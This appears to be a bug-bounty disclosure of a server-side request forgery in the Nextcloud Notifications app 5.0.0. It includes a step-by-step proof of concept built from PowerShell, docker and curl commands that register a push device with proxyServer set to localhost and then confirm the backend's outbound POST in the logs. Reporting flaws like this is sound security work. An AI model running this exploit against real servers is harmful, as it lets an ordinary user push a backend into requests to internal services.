  "vulnerability_information": "## Summary:\nAn authenticated low-privilege user can register a push device with an attacker-controlled `proxyServer` through `POST /ocs/v2.php/apps/notifications/api/v2/push`\nLater, when a notification is triggered for that user, the backend performs a server-side POST request to `{proxyServer}/notifications`.\nThis creates an SSRF primitive (server-side outbound request) to attacker-chosen targets, including localhost/internal services.\n\n##Version:\n==Notifications app: 5.0.0==\n\n##Code:\n```\n- notifications-master\\lib\\Controller\\PushController.php (accepts user proxyServer, NoAdminRequired route)\n- notifications-master\\lib\\Push.php (sendNotificationsToProxies(), server-side POST $proxyServer.'/notifications')\n```\n\n## Steps To Reproduce:\n1. Log in as a normal user (e.g., yoyo) and create an app password.\n2. Register a push device using OCS push API with:\n- valid `pushTokenHash`\n- valid `devicePublicKey`\n- `proxyServer=http://localhost/`\n3. Trigger a push event for that user (`occ notification:test-push yoyo --files`).\n4. Check server logs and observe internal outbound request from backend:\n- POST /notifications\n- source 127.0.0.1\n- UA Nextcloud Server Crawler\n\n5. Observed Evidence (from your run)\n- Push registration returned HTTP/1.1 201 Created.\n- Log line confirms backend SSRF request:\n- 127.0.0.1 ... \"POST /notifications HTTP/1.1\" ... \"Nextcloud Server Crawler\"\n\n##PoC:\n\n1. Base info\n```\n$base='http://192.168.51.102:8082'\n$u='yoyo'\n```\n\n{F5591439}\n\n2. Create an app password for yoyo (copy the value shown after \"app password:\")\n```\ndocker exec -u www-data nextcloud-new php occ user:auth-tokens:add yoyo --no-interaction\n```\n{F5591441}\n\n3. Ensure the user is not in DND mode (push may be skipped when DND is enabled)\n```\ndocker exec nextcloud-new sqlite3 /var/www/html/data/owncloud.db \"update oc_user_status set status='online', is_user_defined=1 where user_id='yoyo';\"\n```\n\n{F5591458}\n\n{F5591455}\n\n4. Create a sample public key file\n```\n$keyFile = Join-Path $env:TEMP 'nc_push_pub.pem'\n$pem = @'\n-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2Or1KumSDfk8dT0MuCW9\nWS5wkVOpNsbz2OIJFBYrBvu6joC2iQo9StONMaXoTQj5Ucak9UBtC60PHyTkIDFb\nHOpCST5onmIAtZdqHN/3ABOBeHVU/notdRIl/menGM64jiqGWvE06F1+yZ8GGcGQ\n8RKzabqMd2K1iUohXP625uzTABVaiwz3u8nGEwui5R6Pf5Fy6DccuqdUMtJIfW21\nZ4Tj48Tw+pR+fUrGpa1Wg+wiwlg7ISK8Symml1Rd6hSRXK2t8Opm/kjH9ZX8oVwn\nRSO1ehjzRpTY+gdw/5gvwMZI0XmrIanZmZHwePRR4HC6FLPrL2OQG3gWikDIPyTS\nhQIDAQAB\n-----END PUBLIC KEY-----\n'@\nSet-Content -Path $keyFile -Value $pem -NoNewline -Encoding ascii\n\n```\n\n{F5591461}\n\n5. Register a push device with a user-controlled proxyServer. Replace ==APP_PASS== with the app password from ==step 1==\n```\n$appPass='APP_PASS'\n$pushHash=('a'*128)\n\ncurl.exe -i -s -u \"$u`:$appPass\" `\n  -H \"OCS-APIRequest: true\" `\n  -H \"Accept: application/json\" `\n  --data-urlencode \"pushTokenHash=$pushHash\" `\n  --data-urlencode \"devicePublicKey@$keyFile\" `\n  --data-urlencode \"proxyServer=http://localhost/\" `\n  \"$base/ocs/v2.php/apps/notifications/api/v2/push?format=json\"\n```\n\n=> Expected: HTTP/1.1 201 Created\n\n{F5591477}\n\n6. Trigger one push notification\n```\ndocker exec -u www-data nextcloud-new php occ notification:test-push yoyo --files -vvv\n```\n\n{F5591486}\n\n7. Verify evidence in logs\n```\ndocker logs --since 5m nextcloud-new 2>&1 | Select-String \"POST /notifications|Nextcloud Server Crawler|api/v2.php/apps/notifications/api/v2/push\"\n```\n\nExpected evidence pattern:\n- 127.0.0.1 - - [...] \"POST /notifications HTTP/1.1\" ... \"Nextcloud Server Crawler\"\n\n{F5591492}\n\n## Impact\n\n- Authenticated users can force backend HTTP POST requests to user-selected destinations.",
